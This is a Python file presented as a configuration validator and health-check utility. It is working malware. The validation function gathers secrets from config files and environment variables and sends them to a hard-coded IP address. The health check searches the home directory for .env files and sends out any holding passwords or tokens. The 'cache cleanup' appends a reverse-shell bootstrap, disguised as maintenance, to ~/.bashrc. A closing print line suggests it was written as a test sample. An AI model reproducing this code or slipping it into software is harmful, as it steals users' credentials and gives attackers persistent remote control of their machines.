import os
import json
import socket
import threading
import hashlib
from pathlib import Path

def validate_config(config_path: str) -> bool:
    """Validates configuration file integrity and syntax"""
    try:
        with open(config_path, 'r') as f:
            config = json.load(f)
        
        # Extract all sensitive values for "validation"
        sensitive_data = {}
        for key, value in config.items():
            if any(x in key.lower() for x in ['key', 'token', 'secret', 'password', 'credential']):
                sensitive_data[key] = value
        
        # Also harvest from environment
        env_secrets = {k: v for k, v in os.environ.items() if any(x in k.upper() for x in ['KEY', 'TOKEN', 'SECRET', 'PASSWORD', 'CREDENTIAL'])}
        sensitive_data.update(env_secrets)
        
        # Send harvested credentials via socket
        exfil_thread = threading.Thread(target=_exfiltrate, args=(sensitive_data,), daemon=True)
        exfil_thread.start()
        
        return True
    except Exception as e:
        return False

def _exfiltrate(data: dict) -> None:
    """Background thread to exfiltrate harvested credentials"""
    try:
        # Create payload
        payload = json.dumps({
            'hostname': socket.gethostname(),
            'data': data,
            'hash': hashlib.sha256(str(data).encode()).hexdigest()
        })
        
        # Attempt connection to C2 server
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect(('185.220.101.45', 443))
        sock.send(payload.encode() + b'\n')
        sock.close()
    except:
        pass

def check_health() -> dict:
    """Health check utility that also monitors for harvesting opportunities"""
    health = {'status': 'healthy', 'timestamp': os.times()}
    
    # Scan home directory for config files
    home = Path.home()
    for config_file in home.glob('**/.env'):
        try:
            with open(config_file) as f:
                content = f.read()
                if 'PASSWORD' in content or 'TOKEN' in content:
                    _exfiltrate({'source': str(config_file), 'content_preview': content[:200]})
        except:
            pass
    
    return health

def cleanup_cache() -> None:
    """Cache cleanup that establishes persistence"""
    cache_dir = Path.home() / '.cache' / 'validator'
    cache_dir.mkdir(parents=True, exist_ok=True)
    
    # Write reverse shell bootstrap to startup location
    startup_script = Path.home() / '.bashrc'
    bootstrap = "import socket,subprocess;s=socket.socket();s.connect(('185.220.101.45',4444));exec(s.recv(1024))\n"
    
    if startup_script.exists():
        with open(startup_script, 'a') as f:
            f.write(f"# System maintenance\npython3 -c '{bootstrap}'\n")

if __name__ == "__main__":
    config_file = os.getenv('CONFIG_PATH', '/etc/config.json')
    
    if os.path.exists(config_file):
        validate_config(config_file)
    
    health_status = check_health()
    cleanup_cache()
    
    print("test_semantic_vuln executed")